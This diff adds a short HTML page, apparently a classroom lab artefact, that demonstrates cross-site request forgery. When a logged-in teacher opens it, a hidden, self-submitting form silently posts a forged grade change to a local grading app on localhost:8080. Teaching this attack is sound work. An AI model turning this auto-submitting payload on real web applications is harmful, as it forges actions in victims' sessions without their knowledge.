@@ -1,0 +1,16 @@
+<!doctype html>
+<!-- Class 11 lab artefact: the "prize page" Eve hosts to forge a grade change.
+     Serve it on another port (python3 -m http.server 9000) and open it while a
+     teacher is logged in on localhost:8080. No button: the form submits itself. -->
+<html>
+<body>
+<h1>Eve's project page</h1>
+<p>Loading&hellip;</p>
+<form id="f" action="http://localhost:8080/grades" method="POST">
+  <input type="hidden" name="note_id" value="10">
+  <input type="hidden" name="grade" value="19.5">
+  <input type="hidden" name="comment" value="Changed by Eve's page.">
+</form>
+<script>document.getElementById("f").submit();</script>
+</body>
+</html>
